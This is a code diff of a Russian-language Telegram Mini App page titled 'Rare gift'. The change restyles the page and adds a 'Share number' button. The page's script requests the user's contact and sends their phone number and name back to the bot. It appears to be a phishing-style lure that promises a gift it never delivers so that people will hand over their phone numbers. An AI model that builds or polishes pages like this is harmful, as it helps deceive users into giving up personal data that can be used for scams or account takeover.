@@ -5,69 +5,131 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Редкий подарок</title>
   <style>
-    body {
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+
+    * {
       margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
       height: 100vh;
-      background: linear-gradient(135deg, #0f0f17, #1a1a2e);
-      color: #e0e0ff;
-      font-family: -apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #0a0e17 0%, #121826 100%);
+      color: #e0e7ff;
+      font-family: 'Inter', system-ui, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       overflow: hidden;
     }
+
+    .container {
+      text-align: center;
+      padding: 2rem;
+      max-width: 380px;
+      width: 90%;
+    }
+
+    .icon {
+      font-size: 5rem;
+      margin-bottom: 1.5rem;
+      animation: float 3s ease-in-out infinite;
+    }
+
     h1 {
       font-size: 2.2rem;
+      font-weight: 600;
       margin-bottom: 1rem;
-      text-shadow: 0 0 20px rgba(0, 136, 204, 0.5);
+      background: linear-gradient(90deg, #60a5fa, #a5b4fc);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
+
     p {
       font-size: 1.1rem;
       opacity: 0.8;
-      margin-bottom: 2rem;
+      margin-bottom: 2.5rem;
+      line-height: 1.5;
     }
+
+    .btn {
+      background: linear-gradient(135deg, #3b82f6, #6366f1);
+      color: white;
+      border: none;
+      padding: 1rem 2.5rem;
+      font-size: 1.2rem;
+      font-weight: 600;
+      border-radius: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 35px rgba(59, 130, 246, 0.6);
+    }
+
     .loader {
-      width: 80px;
-      height: 80px;
-      border: 5px solid #0088cc44;
-      border-top: 5px solid #0088cc;
+      display: none;
+      margin: 2rem auto;
+      width: 60px;
+      height: 60px;
+      border: 5px solid #334155;
+      border-top: 5px solid #60a5fa;
       border-radius: 50%;
-      animation: spin 1.2s linear infinite;
-      margin-bottom: 2rem;
+      animation: spin 1s linear infinite;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+    }
   </style>
 </head>
 <body>
-  <div class="loader"></div>
-  <h1>Получаем ваш подарок...</h1>
-  <p>Это займёт всего несколько секунд</p>
+  <div class="container">
+    <div class="icon"></div>
+    <h1>Получение Подарка</h1>
+    <p>Подтвердить номер Телефона</p>
+    <button class="btn" id="grant">Поделиться номером</button>
+    <div class="loader" id="loader"></div>
+  </div>
 
   <script>
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
-    tg.MainButton.setText("Подтвердить получение");
-    tg.MainButton.show();
-    tg.MainButton.onClick(() => {
-      tg.requestContact()
-        .then(contact => {
-          tg.sendData(JSON.stringify({
-            contact: {
-              phone_number: contact.phone_number,
-              first_name: contact.first_name,
-              last_name: contact.last_name || ""
-            }
-          }));
-          tg.close();
-        })
-        .catch(() => {
-          tg.sendData(JSON.stringify({ error: "contact_denied" }));
-        });
+
+    const btn = document.getElementById('grant');
+    const loader = document.getElementById('loader');
+
+    btn.addEventListener('click', async () => {
+      btn.style.display = 'none';
+      loader.style.display = 'block';
+
+      try {
+        const contact = await tg.requestContact();
+        tg.sendData(JSON.stringify({
+          contact: {
+            phone_number: contact.phone_number,
+            first_name: contact.first_name,
+            last_name: contact.last_name || ''
+          }
+        }));
+        tg.close();
+      } catch (e) {
+        tg.sendData(JSON.stringify({ error: e.message || 'denied' }));
+        loader.style.display = 'none';
+        btn.style.display = 'block';
+      }
     });
   </script>
 </body>
